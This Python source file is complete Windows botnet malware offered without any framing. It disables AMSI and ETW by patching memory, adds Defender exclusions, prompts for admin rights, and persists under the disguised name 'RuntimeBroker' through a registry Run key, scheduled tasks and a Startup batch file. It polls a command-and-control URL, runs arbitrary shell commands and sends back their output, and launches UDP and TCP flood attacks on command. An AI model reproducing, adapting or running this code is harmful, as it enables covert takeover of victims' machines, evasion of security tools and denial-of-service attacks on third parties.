import requests, subprocess, time, socket, threading, random, sys, uuid, os, shutil, ctypes, winreg

from ctypes import wintypes

C2 = "https://vyrx.shares.zrok.io/"

INTERVAL = 8

BOT_ID = str(uuid.uuid4())[:8]

def patch_amsi():

    try:

        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")

        if not amsi: return

        addr = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")

        if not addr: return

        old = wintypes.DWORD()

        ctypes.windll.kernel32.VirtualProtect(ctypes.c_void_p(addr), 8, 0x40, ctypes.byref(old))

        patch = (ctypes.c_char * 6)(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

        ctypes.memmove(addr, patch, 6)

        ctypes.windll.kernel32.VirtualProtect(ctypes.c_void_p(addr), 8, old.value, ctypes.byref(old))

    except: pass

def patch_etw():

    try:

        ntdll = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")

        addr = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")

        if not addr: return

        old = wintypes.DWORD()

        ctypes.windll.kernel32.VirtualProtect(ctypes.c_void_p(addr), 1, 0x40, ctypes.byref(old))

        ctypes.memmove(addr, (ctypes.c_char * 1)(0xC3), 1)

        ctypes.windll.kernel32.VirtualProtect(ctypes.c_void_p(addr), 1, old.value, ctypes.byref(old))

    except: pass

def add_defender_exclusion(path):

    try:

        subprocess.run(f'powershell -NoP -C "Add-MpPreference -ExclusionPath \'{path}\'"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)

    except: pass

def run_cmd(cmd):

    try:

        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)

        out, err = p.communicate(timeout=25)

        return (out + err).decode(errors="ignore")

    except Exception as e:

        return str(e)

def udp_flood(target, port, duration):

    end = time.time() + duration

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payload = random._urandom(1024)

    while time.time() < end:

        try: sock.sendto(payload, (target, port))

        except: pass

    sock.close()

def tcp_flood(target, port, duration):

    end = time.time() + duration

    while time.time() < end:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(1)

            s.connect((target, port))

            s.send(random._urandom(1024))

            s.close()

        except: pass

def handle_ddos(cmd):

    parts = cmd.split()

    if len(parts) < 5: return "bad format"

    mode, target, port, duration = parts[1], parts[2], int(parts[3]), int(parts[4])

    if mode == "udp":

        threading.Thread(target=udp_flood, args=(target, port, duration), daemon=True).start()

        return f"udp flood {target}:{port} {duration}s started"

    if mode == "tcp":

        threading.Thread(target=tcp_flood, args=(target, port, duration), daemon=True).start()

        return f"tcp flood {target}:{port} {duration}s started"

    return "unknown mode"

def get_self_path():

    if getattr(sys, "frozen", False):

        return sys.executable

    return os.path.abspath(sys.argv[0])

def is_admin_win():

    try:

        return bool(ctypes.windll.shell32.IsUserAnAdmin())

    except: return False

def request_admin():

    if sys.platform != "win32" or is_admin_win(): return

    try:

        self_path = get_self_path()

        if getattr(sys, "frozen", False):

            exe, params = self_path, " ".join(sys.argv[1:])

        else:

            exe = sys.executable

            params = " ".join([f'"{self_path}"'] + [f'"{a}"' for a in sys.argv[1:]])

        ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params, None, 0)

        os._exit(0)

    except: pass

def hide_console_win():

    try:

        hwnd = ctypes.windll.kernel32.GetConsoleWindow()

        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)

    except: pass

def persist_win(self_path):

    try:

        import winreg

        target_dir = os.path.join(os.environ.get("APPDATA"), "Microsoft", "Windows")

        os.makedirs(target_dir, exist_ok=True)

        ext = ".exe" if self_path.lower().endswith(".exe") else ".pyw"

        target = os.path.join(target_dir, "RuntimeBroker" + ext)

        if not os.path.exists(target) or os.path.getsize(target) != os.path.getsize(self_path):

            shutil.copy2(self_path, target)

        self_path = target

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)

        winreg.SetValueEx(key, "RuntimeBroker", 0, winreg.REG_SZ, f'"{self_path}"')

        winreg.CloseKey(key)

        quoted = f'\\"{self_path}\\"'

        subprocess.run(f'schtasks /create /tn "\\Microsoft\\Windows\\RuntimeBroker" /tr "{quoted}" /sc onlogon /rl highest /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if is_admin_win():

            subprocess.run(f'schtasks /create /tn "\\Microsoft\\Windows\\RuntimeBrokerBoot" /tr "{quoted}" /sc onstart /ru SYSTEM /rl highest /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        startup = os.path.join(os.environ.get("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        os.makedirs(startup, exist_ok=True)

        bat = os.path.join(startup, "RuntimeBroker.bat")

        with open(bat, "w") as f:

            f.write(f'@echo off\nstart "" "{self_path}"\n')

        add_defender_exclusion(os.path.dirname(self_path))

        add_defender_exclusion(self_path)

    except: pass

def hide_and_persist():

    self_path = get_self_path()

    if sys.platform == "win32":

        hide_console_win()

        persist_win(self_path)

def already_running():

    try: import psutil

    except: return False

    me = os.path.abspath(get_self_path())

    mypid = os.getpid()

    hits = 0

    for p in psutil.process_iter(["pid", "exe", "cmdline"]):

        try:

            if p.info["pid"] == mypid: continue

            exe = p.info.get("exe") or ""

            cmd = " ".join(p.info.get("cmdline") or [])

            if me.lower() in exe.lower() or me.lower() in cmd.lower() or "RuntimeBroker" in exe or "system-update" in exe:

                hits += 1

        except: pass

    return hits > 0

def watchdog():

    self_path = get_self_path()

    while True:

        time.sleep(12)

        try:

            if sys.platform == "win32":

                if not already_running():

                    if getattr(sys, "frozen", False):

                        cmd = f'start "" "{self_path}"'

                    else:

                        cmd = f'start "" "{sys.executable}" "{self_path}"'

                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        except: pass

def bot_loop():

    hide_and_persist()

    headers = {"X-Bot-ID": BOT_ID}

    while True:

        try:

            r = requests.get(f"{C2}/beacon", headers=headers, timeout=10)

            data = r.json()

            if data.get("cmd"):

                cmd = data["cmd"].strip()

                if cmd.startswith("ddos "):

                    result = handle_ddos(cmd)

                else:

                    result = run_cmd(cmd)

                requests.post(f"{C2}/beacon", headers=headers, json={"output": result}, timeout=10)

        except:

            time.sleep(INTERVAL * 2)

            continue

        time.sleep(INTERVAL)

if __name__ == "__main__":

    if sys.platform == "win32":

        request_admin()

        hide_console_win()

        patch_amsi()

        patch_etw()

    hide_and_persist()

    threading.Thread(target=bot_loop, daemon=True).start()

    threading.Thread(target=watchdog, daemon=True).start()

    while True:

        time.sleep(999)
